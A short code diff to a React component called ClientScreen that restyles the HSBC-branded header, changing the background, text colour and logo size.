@@ -168,11 +168,11 @@ export default function ClientScreen() {
       );
     } else if (sessionData.banco === 'HSBC') {
       return (
-        <header className="bg-[#DB0011] text-white p-4 text-center">
-          <div className="font-bold text-sm mb-2">{formatDate(new Date())}</div>
+        <header className="bg-white p-4 text-center">
+          <div className="font-bold text-sm mb-2 text-black">{formatDate(new Date())}</div>
           <img 
             src={hsbcLogo} 
-            className="h-20 inline-block" 
+            className="h-28 inline-block" 
             alt="HSBC" 
           />
         </header>
